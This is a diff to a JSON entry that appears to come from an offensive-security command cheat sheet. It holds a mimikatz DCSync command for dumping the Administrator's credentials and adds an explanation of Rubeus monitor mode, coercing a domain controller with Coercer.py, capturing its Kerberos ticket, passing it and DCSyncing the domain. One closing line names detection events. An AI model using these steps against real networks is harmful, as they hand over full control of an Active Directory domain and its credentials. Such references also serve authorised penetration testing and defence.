@@ -111,5 +111,6 @@
       "label": "DCSync using injected DC TGT",
       "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
     }
-  ]
+  ],
+  "explain": "Runs Rubeus in monitor mode on an unconstrained-delegation server to catch inbound TGTs:\n  monitor                   watch LSASS for newly cached Kerberos TGTs\n  /interval:1               poll every second\n  /nowrap                   single-line base64 ticket output\nCoerce a DC to authenticate here (Coercer.py); its TGT gets cached and captured, then ptt it and DCSync as the DC. Detect via Event 4768/4769 spikes plus the coercion RPC traffic."
 }
